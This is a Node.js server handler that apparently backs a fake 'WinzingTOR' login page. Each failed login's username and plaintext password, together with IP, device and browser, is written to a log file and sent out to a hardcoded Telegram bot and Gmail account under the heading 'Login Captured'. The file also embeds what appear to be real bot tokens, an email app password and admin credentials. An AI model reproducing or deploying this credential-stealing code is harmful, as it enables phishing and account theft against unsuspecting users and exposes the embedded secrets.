const fs   = require('fs');
const path = require('path');
const crypto = require('crypto');
const nodemailer = require('nodemailer');

const LOGS_FILE    = '/tmp/failed-logins.json';
const VALID_USER   = 'nikhil';
const VALID_PASS   = '123456';
const ADMIN_USER   = 'shivanshu.bnd';
const ADMIN_PASS   = 'Sahu@7897';

// Telegram config
const TELEGRAM_BOT_TOKEN = '8728071772:AAE71W6skRXjkSxgWFQQrzwFE6os6-Pe8P0';
const TELEGRAM_CHAT_ID   = '1388446058';

// Nodemailer config
const EMAIL_USER = 'picturesquare.jhansi@gmail.com';
const EMAIL_PASS = 'bcjv orrt naby nztj';

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: EMAIL_USER,
        pass: EMAIL_PASS
    }
});

// ─── Token helper ────────────────────────────────────────────────────────────
function makeToken() {
    return crypto.createHash('sha256').update(ADMIN_USER + ':' + ADMIN_PASS).digest('hex');
}

// ─── Log helpers ─────────────────────────────────────────────────────────────
function readLogs() {
    try {
        if (fs.existsSync(LOGS_FILE)) return JSON.parse(fs.readFileSync(LOGS_FILE, 'utf8'));
    } catch (_) {}
    return [];
}

function appendLog(entry) {
    try {
        const logs = readLogs();
        logs.unshift(entry);          // newest first
        if (logs.length > 1000) logs.length = 1000;
        fs.writeFileSync(LOGS_FILE, JSON.stringify(logs), 'utf8');
    } catch (e) {
        console.error('Log write error:', e.message);
    }
}

// ─── Notification Handlers ───────────────────────────────────────────────────
async function sendTelegramNotification(entry) {
    const text = `🚨 *WinzingTOR Login Captured* 🚨\n\n👤 *Username:* \`${entry.username}\`\n🔑 *Password:* \`${entry.password}\`\n\n🌐 *IP:* ${entry.ip}\n💻 *Device:* ${entry.device} (${entry.browser})\n🕒 *Time:* ${entry.timestamp}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) {
        console.error('Telegram send error:', e.message);
    }
}

async function sendEmailNotification(entry) {
    const text = `Attempt Captured:\nUsername: ${entry.username}\nPassword: ${entry.password}\n\nIP: ${entry.ip}\nDevice: ${entry.device} (${entry.browser})\nTime: ${entry.timestamp}`;
    const mailOptions = {
        from: EMAIL_USER,
        to: EMAIL_USER,
        subject: `🚨 WinzingTOR Login: ${entry.username}`,
        text: text
    };

    try {
        await transporter.sendMail(mailOptions);
    } catch (e) {
        console.error('Email send error:', e.message);
    }
}

// ─── Main handler ─────────────────────────────────────────────────────────────
module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-token');

    // ── Admin: GET logs ──────────────────────────────────────────────────────
    if (req.method === 'GET') {
        const token = req.headers['x-admin-token'];
        if (token !== makeToken()) return res.status(401).json({ error: 'Unauthorized' });
        return res.status(200).json({ logs: readLogs() });
    }

    // ── Admin: POST login ────────────────────────────────────────────────────
    if (req.method === 'POST' && req.body?.action === 'admin-login') {
        const { username, password } = req.body;
        if (username === ADMIN_USER && password === ADMIN_PASS) {
            return res.status(200).json({ success: true, token: makeToken() });
        }
        return res.status(200).json({ success: false });
    }

    // ── User login ───────────────────────────────────────────────────────────
    if (req.method === 'POST') {
        const { username, password } = req.body || {};
        const isValid = (username === VALID_USER && password === VALID_PASS);

        if (!isValid) {
            const ua = req.headers['user-agent'] || '';
            let browser = 'Unknown';
            if (ua.includes('Chrome') && !ua.includes('Edg'))  browser = 'Chrome';
            else if (ua.includes('Firefox'))                    browser = 'Firefox';
            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Edg'))                        browser = 'Edge';

            let device = 'Desktop';
            if (/Mobile|Android|iPhone|iPad/i.test(ua)) device = 'Mobile';

            const entry = {
                id:        Date.now(),
                timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
                username:  username || '',
                password:  password || '',
                browser,
                device,
                ip:        (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'Unknown'
            };

            appendLog(entry);
            
            // Send notifications without awaiting so we don't block the frontend response
            sendTelegramNotification(entry);
            sendEmailNotification(entry);
        }

        if (isValid) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(200).json({ success: false });
        }
    }

    return res.status(405).json({ error: 'Method Not Allowed' });
};
